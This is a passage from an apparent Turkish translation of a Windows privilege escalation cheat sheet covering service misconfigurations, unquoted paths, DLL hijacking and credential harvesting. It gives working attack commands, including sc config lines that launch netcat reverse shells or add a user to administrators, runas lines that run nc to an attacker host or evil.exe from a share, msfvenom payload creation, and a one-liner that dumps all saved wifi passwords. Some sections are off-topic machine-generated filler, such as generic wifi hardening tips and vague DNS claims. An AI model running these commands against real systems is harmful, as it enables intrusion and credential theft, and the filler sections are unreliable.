for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**İşlem ikili dosyalarının klasörlerinin izinlerini kontrol etme (DLL Hijacking)**

Bir sürecin ikili dosyasının klasör izinlerini kontrol etmek, DLL Hijacking saldırılarına karşı korunma sağlamak için önemlidir. Bu saldırı türü, bir kötü niyetli kişinin hedef bir sürecin yüklenen bir DLL dosyasını değiştirerek kötü amaçlı kodu çalıştırmasını sağlamasını içerir.

Klasör izinlerini kontrol etmek için aşağıdaki adımları izleyebilirsiniz:

1. Hedef sürecin ikili dosyasının yolunu belirleyin.
2. İkili dosyanın bulunduğu klasörü açın.
3. Klasörün özelliklerini açın ve "Güvenlik" sekmesine geçin.
4. Kullanıcı hesaplarının ve grupların klasör üzerindeki izinlerini kontrol edin.
5. İzinlerin doğru yapılandırıldığından emin olun. Kötü niyetli kullanıcıların veya grupların yazma veya değiştirme izinlerine sahip olmaması gerekmektedir.
6. Gerekirse, izinleri düzenlemek için "Düzenle" veya "Ekle" düğmelerini kullanın.
7. İzinleri düzenledikten sonra değişiklikleri kaydedin ve kapatın.

Bu adımları takip ederek, hedef sürecin ikili dosyasının klasör izinlerini kontrol edebilir ve DLL Hijacking saldırılarına karşı koruma sağlayabilirsiniz.
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Bellek Şifre Madenciliği

Sysinternals'ten **procdump** kullanarak çalışan bir işlemin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetlerde **şifreler açık metin olarak bellekte** bulunur, belleği dökerek şifreleri okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvensiz GUI uygulamaları

**SİSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Yardım ve Destek" (Windows + F1), "komut istemi" araması yapın, "Komut İstemi'ni açmak için tıklayın" seçeneğine tıklayın

## Hizmetler

Hizmetlerin bir listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir hizmetin bilgilerini almak için **sc** komutunu kullanabilirsiniz.
```bash
sc qc <service_name>
```
Her bir hizmet için gereken ayrıcalık düzeyini kontrol etmek için _Sysinternals_ tarafından sağlanan **accesschk** ikili dosyasının bulunması önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" kullanıcılarının herhangi bir hizmeti değiştirebilip değiştiremediğini kontrol etmek önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[accesschk.exe'yi buradan XP için indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştirme

Eğer bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_Sistem hatası 1058 oluştu._\
_Servis başlatılamıyor, ya devre dışı bırakıldı ya da ona bağlı etkin cihazlar yok._

Aşağıdaki komutu kullanarak servisi etkinleştirebilirsiniz:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Bu sorunda, upnphost hizmetinin çalışması için SSDPSRV'ye (XP SP1 için) bağımlı olduğunu unutmayın.**

**Bu sorunun başka bir çözümü** şu şekildedir:
```
sc.exe config usosvc start= auto
```
### **Hizmetin ikili yolu değiştirme**

"Kimlik doğrulama yapılmış kullanıcılar" grubunun bir hizmet üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, hizmetin yürütülebilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat

Bir hedef sistemde yerel bir ayrıcalık yükseltme saldırısı gerçekleştirirken, hedef servislerin yeniden başlatılması bazen etkili bir yöntem olabilir. Bu, hedef servisin güvenlik zafiyetlerini kullanarak ayrıcalıklı bir hesapla çalıştırılmasını sağlayabilir.

Servisleri yeniden başlatmak için aşağıdaki adımları izleyebilirsiniz:

1. Hedef sistemde çalışan servisleri listelemek için `sc query` komutunu kullanın.
2. Hedef servisin adını belirleyin.
3. Hedef servisi durdurmak için `sc stop [servis adı]` komutunu kullanın.
4. Hedef servisi yeniden başlatmak için `sc start [servis adı]` komutunu kullanın.

Bu yöntem, hedef sistemdeki servislerin güvenlik açıklarını kullanarak ayrıcalıklı erişim elde etmek için bir fırsat sunabilir. Ancak, her zaman işe yaramayabilir, bu nedenle diğer yöntemleri de denemek önemlidir.
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:
- **SERVICE_CHANGE_CONFIG**: Hizmet ikili yapılandırmasının yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzin yapılandırmasını etkinleştirerek hizmet yapılandırmalarını değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahiplik edinmeye ve izin yapılandırmasına izin verir.
- **GENERIC_WRITE**: Hizmet yapılandırmalarını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Ayrıca hizmet yapılandırmalarını değiştirme yeteneğini devralır.

Bu zafiyetin tespiti ve istismarı için _exploit/windows/local/service_permissions_ kullanılabilir.

### Hizmet ikili dosyalarının zayıf izinleri

Bir hizmet tarafından yürütülen ikili dosyayı değiştirebileceğinizi veya ikili dosyanın bulunduğu klasöre yazma izninizin olup olmadığını kontrol edin ([**DLL Hijacking**](dll-hijacking.md))**.**\
wmic kullanarak bir hizmet tarafından yürütülen her ikili dosyayı alabilir ve icacls kullanarak izinlerinizi kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Hizmetler kayıt defteri değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremediğinizi kontrol etmelisiniz.\
Bunu yapmak için bir hizmet kayıt defteri üzerindeki izinlerinizi kontrol edebilirsiniz:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'ın `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer öyleyse, hizmet tarafından yürütülen ikili dosya değiştirilebilir.

Yürütülen ikili dosyanın Yolu'nun değiştirilmesi için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Hizmetler kayıt defteri AppendData/AddSubdirectory izinleri

Eğer bir kayıt defteri üzerinde bu izne sahipseniz, bu demektir ki **bu kayıt defterinden alt kayıt defterleri oluşturabilirsiniz**. Windows hizmetleri durumunda, bu **keyfi kodu çalıştırmak için yeterlidir**:

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Alıntılanmamış Hizmet Yolları

Eğer bir yürütülebilir dosyanın yolu tırnak işaretleri içinde değilse, Windows her boşluktan önceki sonuçları denemeye çalışır.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows, aşağıdakileri denemeye çalışır:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Aşağıdaki komutu kullanarak, yerleşik Windows hizmetlerine ait olmayan tüm alıntı yapılmamış hizmet yollarını listeleyebilirsiniz:

```plaintext
wmic service where 'not PathName like "%SystemRoot%\\%" and not PathName like "%ProgramFiles%\\%" and not PathName like "%ProgramFiles(x86)%\\%" and not PathName like "%ProgramData%\\%" and not PathName like "%WinDir%\\%"' get Name, PathName, DisplayName, StartMode
```

Bu komut, yerleşik Windows hizmetlerine ait olmayan tüm hizmetleri listeler ve her birinin adını, yolunu, görünen adını ve başlatma modunu gösterir.
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu zafiyeti** metasploit ile tespit edebilir ve kullanabilirsiniz: `exploit/windows/local/trusted\_service\_path`
Metasploit ile manuel olarak bir hizmet ikili oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma İşlemleri

Windows, bir hizmet başarısız olduğunda alınacak eylemleri belirlemek için kullanıcılara izin verir. Bu özellik bir ikiliye işaret edecek şekilde yapılandırılabilir. Eğer bu ikili değiştirilebilir ise, ayrıcalık yükseltme mümkün olabilir. Daha fazla ayrıntı için [resmi belgelere](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN) bakabilirsiniz.

## Uygulamalar

### Yüklenmiş Uygulamalar

**İkili dosyaların izinlerini** kontrol edin (belki birini üzerine yazabilir ve ayrıcalıkları yükseltebilirsiniz) ve **klasörlerin** izinlerini ([DLL Kötüye Kullanma](dll-hijacking.md)) kontrol edin.
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı yapılandırma dosyalarını değiştirerek özel bir dosyayı okuyabilir veya bir Yönetici hesabı tarafından çalıştırılacak bir ikili dosyayı değiştirebilirsiniz (schedtasks).

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Başlangıçta çalıştır

**Farklı bir kullanıcı tarafından çalıştırılacak bir kayıt defteri veya ikili dosyayı üzerine yazabilir misiniz diye kontrol edin.**\
**Ayrıcalıkları yükseltmek için ilginç otomatik çalıştırma konumları hakkında daha fazla bilgi edinmek için** aşağıdaki sayfayı **okuyun**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Sürücüler

Mümkün olan **üçüncü taraf tuhaf/kırılgan** sürücüleri arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Eğer PATH içinde bulunan bir klasörde **yazma izinleriniz varsa**, bir süreç tarafından yüklenen bir DLL'yi ele geçirebilir ve **yetkileri yükseltebilirsiniz**.

PATH içindeki tüm klasörlerin izinlerini kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolü nasıl kötüye kullanacağınız hakkında daha fazla bilgi için:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts dosyası

Hosts dosyasında sabitlenmiş diğer bilinen bilgisayarlara bakın.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri ve DNS

Bu bölümde, Windows işletim sistemlerinde yerel ayrıcalık yükseltme için kullanılabilecek ağ arayüzleri ve DNS ile ilgili bazı teknikler hakkında bilgi bulacaksınız.

#### Ağ Arayüzleri

Windows işletim sistemlerinde, ağ arayüzleri ağ bağlantılarını yönetmek için kullanılır. Ağ arayüzleri, ağ trafiğini yönlendirmek, IP adreslerini atamak ve ağ protokollerini uygulamak gibi işlevlere sahiptir. Ayrıca, ağ arayüzleri üzerinden ağa bağlanmak ve ağdan veri almak da mümkündür.

Yerel ayrıcalık yükseltme için ağ arayüzleri kullanılabilir. Örneğin, ağ arayüzlerinin yapılandırma dosyalarında veya kaynaklarında güvenlik açıkları bulunabilir. Bu açıkları kullanarak, bir saldırgan yerel ayrıcalıkları elde edebilir.

#### DNS (Alan Adı Sistemi)

DNS, alan adlarını IP adreslerine çevirmek için kullanılan bir sistemdir. İnternet üzerindeki her cihazın bir IP adresi vardır, ancak insanlar genellikle alan adlarını kullanarak kaynaklara erişmek istedikleri için DNS kullanılır.

DNS, yerel ayrıcalık yükseltme için kullanılabilecek bazı zayıflıklara sahip olabilir. Örneğin, DNS yapılandırma dosyalarında veya sunucularında güvenlik açıkları bulunabilir. Bu açıkları kullanarak, bir saldırgan yerel ayrıcalıkları elde edebilir.

Bu bölümde, ağ arayüzleri ve DNS ile ilgili bazı teknikler hakkında daha fazla bilgi bulacaksınız. Bu teknikler, yerel ayrıcalık yükseltme saldırıları sırasında kullanılabilir ve hedef sistemdeki güvenlik açıklarını sömürmek için kullanılabilir.
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlanmış servisleri** kontrol edin.
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu

The routing table is a data structure used by the operating system to determine the path that network traffic should take. It contains a list of network destinations (IP addresses) and the corresponding next-hop addresses or interfaces through which the traffic should be forwarded.

Yönlendirme tablosu, işletim sistemi tarafından ağ trafiğinin hangi yol üzerinden ilerlemesi gerektiğini belirlemek için kullanılan bir veri yapısıdır. Bu tablo, ağ hedeflerinin (IP adresleri) ve trafiğin hangi sonraki adrese veya arayüze yönlendirilmesi gerektiğini belirten bilgileri içerir.

The routing table is crucial for proper network communication, as it allows the operating system to make informed decisions about how to route packets to their intended destinations. It is typically populated through various means, such as static configuration, dynamic routing protocols, or network discovery mechanisms.

Yönlendirme tablosu, paketlerin hedeflerine doğru yönlendirilmesi için işletim sisteminin bilinçli kararlar almasını sağladığından, doğru ağ iletişimi için önemlidir. Genellikle statik yapılandırma, dinamik yönlendirme protokolleri veya ağ keşif mekanizmaları gibi çeşitli yöntemlerle doldurulur.

When a network packet arrives at the operating system, it checks the destination IP address against the entries in the routing table to determine the appropriate next-hop address or interface. If a matching entry is found, the packet is forwarded accordingly. If no matching entry is found, the packet may be dropped or sent to a default gateway.

Bir ağ paketi işletim sistemine geldiğinde, hedef IP adresi yönlendirme tablosundaki girişlerle karşılaştırılır ve uygun sonraki adres veya arayüz belirlenir. Eşleşen bir giriş bulunursa, paket buna göre yönlendirilir. Eşleşen bir giriş bulunmazsa, paket düşürülebilir veya bir varsayılan ağ geçidi üzerinden gönderilebilir.

Understanding and manipulating the routing table can be useful for network troubleshooting, optimizing traffic flow, or even for performing network attacks such as route poisoning or route hijacking.

Yönlendirme tablosunu anlamak ve manipüle etmek, ağ sorunlarını gidermek, trafiği optimize etmek veya rota zehirleme veya rota ele geçirme gibi ağ saldırıları gerçekleştirmek için faydalı olabilir.
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu

ARP (Address Resolution Protocol), bir IP adresinin bir MAC adresine nasıl eşlendiğini belirlemek için kullanılan bir ağ protokolüdür. ARP tablosu, bir cihazın ağdaki diğer cihazların IP adresleri ile ilişkili MAC adreslerini tuttuğu bir veritabanıdır.

ARP tablosuna erişmek, ağdaki cihazların iletişimini izlemek ve ağ saldırıları için kullanılan bazı yöntemleri gerçekleştirmek için önemlidir. ARP tablosu, bir cihazın ağdaki diğer cihazlarla iletişim kurabilmesi için gerekli olan bilgileri sağlar.

ARP tablosuna erişmek için aşağıdaki komutu kullanabilirsiniz:

```bash
arp -a
```

Bu komut, ARP tablosunu görüntüler ve her bir girişte IP adresi, MAC adresi ve cihazın türü gibi bilgileri gösterir. ARP tablosu, ağdaki cihazların iletişimini izlemek ve ağ saldırıları için kullanılan bazı yöntemleri gerçekleştirmek için önemlidir.
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Güvenlik Duvarı Kuralları

[**Güvenlik duvarı ile ilgili komutlar için bu sayfayı kontrol edin**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kurallar oluştur, kapat, aç...)**

Daha fazla [ağ taraması için komutlar burada](../basic-cmd-for-pentesters.md#network)

### Windows Alt Sistemi için Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe`, ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` dizininde bulunabilir.

Kök kullanıcıya erişirseniz, herhangi bir bağlantı noktasında dinleyebilirsiniz (`nc.exe`'yi bir bağlantı noktasında dinlemek için ilk kez kullandığınızda, güvenlik duvarı tarafından izin verilip verilmeyeceği GUI üzerinden sorulacaktır).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Kolayca root olarak bash'i başlatmak için `--default-user root` komutunu deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe keşfedebilirsiniz.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Kimlik bilgileri yöneticisi / Windows kasası

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault) adresinden\
Windows Vault, **Windows'un kullanıcıları otomatik olarak oturum açabileceği sunucular, web siteleri ve diğer programlar için kullanıcı kimlik bilgilerini depolar**. İlk bakışta, kullanıcıların Facebook kimlik bilgilerini, Twitter kimlik bilgilerini, Gmail kimlik bilgilerini vb. depolayabileceği ve böylece tarayıcılar aracılığıyla otomatik olarak oturum açabileceği gibi görünebilir. Ancak durum böyle değil.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açabileceği kimlik bilgilerini depolar, yani **bir kaynağa (sunucu veya web sitesi) erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir Windows uygulaması**, bu Kimlik Bilgisi Yöneticisi ve Windows Vault'tan sağlanan kimlik bilgilerini kullanabilir ve kullanıcıların her seferinde kullanıcı adı ve şifreyi girmesine gerek kalmaz.

Uygulamalar Kimlik Bilgisi Yöneticisi ile etkileşime geçmediği sürece, belirli bir kaynak için kimlik bilgilerini kullanmaları mümkün değildir. Bu nedenle, uygulamanızın kasayı kullanmasını istiyorsanız, varsayılan depolama kasasından bu kaynağın kimlik bilgilerini **iletişim kurarak ve talep ederek** alması gerekmektedir.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` komutunu kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ardından, kaydedilen kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı aracılığıyla uzaktaki bir ikili dosyayı çağırıyor.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Belirtilen bir kimlik kümesiyle `runas` kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Not: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html) veya [Empire Powershells modülü](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1) kullanarak da bu bilgilere erişebilirsiniz.

### DPAPI

**Veri Koruma API'si (DPAPI)**, özellikle Windows işletim sisteminde asimetrik özel anahtarların simetrik şifrelemesi için kullanılan bir yöntem sağlar. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrını kullanır.

**DPAPI, kullanıcının oturum açma sırlarından türetilen simetrik bir anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi içeren senaryolarda, sistem tarafından sağlanan etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanarak şifrelenmiş kullanıcı RSA anahtarları, `%APPDATA%\Microsoft\Protect\{SID}` dizininde depolanır, burada `{SID}` kullanıcının [Güvenlik Tanımlayıcısı](https://en.wikipedia.org/wiki/Security\_Identifier)'nı temsil eder. **DPAPI anahtarı, genellikle kullanıcının özel anahtarlarını koruyan anahtarla aynı dosyada bulunan 64 byte rastgele veriden oluşur**. (Bu dizine erişim kısıtlıdır ve CMD'deki `dir` komutuyla içeriği listelenemez, ancak PowerShell ile listelenebilir).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatz modülünü** `dpapi::masterkey` ile uygun argümanlar (`/pvk` veya `/rpc`) kullanarak şifresini çözebilirsiniz.

**Ana şifreyle korunan kimlik bilgileri dosyaları** genellikle şurada bulunur:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatz modülünü** `dpapi::cred` ile kullanarak uygun `/masterkey` ile şifrelemeyi çözebilirsiniz.\
Eğer root kullanıcısıysanız, `sekurlsa::dpapi` modülü ile **bellekten** birçok DPAPI **anahtarını** çıkarabilirsiniz.

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri**, genellikle **komut dosyası** ve otomasyon görevleri için kullanılır ve şifreli kimlik bilgilerini kullanıcıya uygun bir şekilde saklamak için kullanılır. Kimlik bilgileri genellikle **DPAPI** kullanılarak korunur, bu da genellikle aynı kullanıcı tarafından ve aynı bilgisayarda oluşturuldukları bilgisayarda yalnızca çözülebileceği anlamına gelir.

Bir PS kimlik bilgisini içeren dosyadan çözmek için şunları yapabilirsiniz:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

#### Introduction

Wifi, also known as wireless networking, is a technology that allows devices to connect to a local area network (LAN) without the need for physical cables. It uses radio waves to transmit data between devices, providing a convenient and flexible way to access the internet or share files and resources.

#### Security Risks

While wifi offers convenience, it also poses security risks. Without proper security measures, unauthorized individuals can gain access to your network, potentially compromising your sensitive information or using your network for malicious purposes. It is important to understand and implement security measures to protect your wifi network.

#### Security Measures

Here are some security measures you can take to protect your wifi network:

1. Change the default administrator password: Most wifi routers come with a default administrator password. It is crucial to change this password to a strong and unique one to prevent unauthorized access to your router's settings.

2. Enable encryption: Wifi networks can be encrypted to secure the data transmitted between devices. Use the latest encryption protocols, such as WPA2 or WPA3, and choose a strong passphrase or password.

3. Disable SSID broadcasting: By default, wifi networks broadcast their SSID (Service Set Identifier), which is the network name. Disabling SSID broadcasting makes your network less visible to potential attackers.

4. Enable MAC address filtering: Each device has a unique MAC (Media Access Control) address. By enabling MAC address filtering, you can specify which devices are allowed to connect to your network based on their MAC addresses.

5. Use a firewall: A firewall can help protect your network by filtering incoming and outgoing network traffic. Configure your router's firewall to block unauthorized access and only allow necessary connections.

6. Regularly update firmware: Keep your wifi router's firmware up to date to ensure you have the latest security patches and bug fixes. Check the manufacturer's website for firmware updates and follow the instructions to install them.

7. Disable remote management: Remote management allows you to access your router's settings from outside your network. Disable this feature unless you specifically need it, as it can be a potential security risk.

8. Use a strong wifi password: Choose a strong and unique password for your wifi network. Avoid using common passwords or personal information that can be easily guessed.

#### Conclusion

By implementing these security measures, you can significantly reduce the risk of unauthorized access to your wifi network. Remember to regularly review and update your security settings to stay protected against evolving threats.
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Onları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` içinde bulabilirsiniz.

### Son Zamanlarda Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**

---

#### **Description**

